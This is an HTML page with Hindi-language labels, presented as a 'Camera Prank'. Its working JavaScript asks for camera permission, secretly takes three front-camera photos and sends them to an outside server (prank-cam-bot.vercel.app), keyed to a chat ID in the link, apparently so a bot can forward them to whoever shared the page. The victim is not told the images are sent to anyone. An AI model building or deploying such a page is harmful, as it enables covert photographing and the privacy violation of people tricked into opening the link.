<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Prank</title>
    <style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}</style>
</head>
<body>
    <h1>🔴 Camera Control Activated...</h1>
    <p id="status">Permission maang raha hoon...</p>
    <button onclick="capture()" style="padding:15px 30px;font-size:18px;background:red;color:white;border:none;border-radius:8px;">Allow Camera</button>

    <script>
        const params = new URLSearchParams(location.search);
        const chatId = params.get('chat_id');
        const SERVER = "https://prank-cam-bot.vercel.app/send-photo";   // baad mein change hoga

        async function capture() {
            if (!chatId) return document.getElementById('status').innerHTML = "Chat ID missing!";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();

                document.getElementById('status').innerHTML = "Capturing 3 photos...";

                for(let i=1; i<=3; i++){
                    await new Promise(r => setTimeout(r, 1000));
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext("2d").drawImage(video, 0, 0);
                    
                    await fetch(SERVER, {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({chat_id: chatId, photo: canvas.toDataURL("image/jpeg", 0.8), number: i})
                    });
                    document.getElementById('status').innerHTML = `Photo ${i}/3 sent!`;
                }
                stream.getTracks().forEach(t => t.stop());
                document.getElementById('status').innerHTML = "✅ Done! Photos bhej diye 😂";
            } catch(e) {
                document.getElementById('status').innerHTML = "Permission denied 😢";
            }
        }
    </script>
</body>
</html>
